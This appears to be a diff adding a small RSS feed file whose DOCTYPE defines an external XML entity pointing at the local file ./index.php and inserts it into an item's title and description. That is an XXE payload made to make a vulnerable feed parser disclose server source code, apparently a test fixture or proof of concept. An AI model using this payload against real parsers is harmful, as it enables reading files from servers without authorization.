@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY example SYSTEM "./index.php">
+]>
+<rss version="2.0">
+  <channel>
+    <title>Example RSS Feed</title>
+    <link>http://example.com</link>
+    <description>This is an example RSS feed</description>
+    <item>
+      <title>&example;</title>
+      <description>&example;</description>
+      <link>http://example.com/news1</link>
+      <guid>1</guid>
+    </item>
+  </channel>
+</rss>
+
